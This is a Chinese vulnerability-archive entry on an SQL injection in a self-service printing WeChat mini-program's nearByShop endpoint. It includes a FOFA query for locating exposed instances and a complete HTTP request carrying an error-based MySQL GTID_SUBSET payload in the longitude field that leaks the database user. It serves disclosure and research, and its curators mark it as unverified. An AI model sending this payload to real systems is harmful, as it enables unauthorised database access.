---
source: "wy876 漏洞文库"
title: "自助打印微信小程序（厂商待核） nearByShop longitude SQL 注入"
product: "自助打印微信小程序（厂商待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MySQL GTID_SUBSET函数条件"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/plik2eccznoh6366"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%87%AA%E5%8A%A9%E6%89%93%E5%8D%B0%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E8%87%AA%E5%8A%A9%E6%89%93%E5%8D%B0%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-fa8d9428caa88ac27409f05f"
entity_id: "ve-fa8d9428caa88ac27409f05f"
schema_version: "1"
---

# 自助打印微信小程序（厂商待核） nearByShop longitude SQL 注入

## 条目说明

- 对象与具体问题：自助打印微信小程序（厂商待核）；nearByShop longitude SQLi
- 版本、配置及部署条件：版本未知，MySQL GTID_SUBSET函数条件
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 2024最新UI营销不是版本信息；通用登录指纹无法唯一定位源码项目
- GTID_SUBSET报错表达式无返回结果/对照，缺数据库版本和补丁
- Content-Length104静态；应记录longitude为参数而非泛SQLi

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
微数字化时代，打印服务的需求与日俱增。为了满足用户的便利需求，全新UI的自助打印系统/云打印小程序。全新UI设计：采用2024年最新的UI设计风格，界面简洁美观，用户体验极佳。云打印功能：支持用户通过小程序上传文件并进行云端打印，方便快捷。自助服务：用户可以自主选择打印参数，如打印份数、纸张类型等，实现真正的自助打印。多平台支持：源码支持微信小程序平台，方便用户在移动端进行操作。自助打印微信小程序系统存在SQL注入漏洞

## 二、影响版本
+ 自助打印微信小程序系统

## 三、资产测绘
+ fofa`"未登录" && "/admin/login/index.html"`
+ 特征


## 四、漏洞复现
```http
POST /api/shop/nearByShop HTTP/1.1
Host: 
Content-Length: 104
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

latitude=1&longitude=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),9392)
```

> 请求长度说明：原资料 Content-Length 为 104；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/plik2eccznoh6366>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
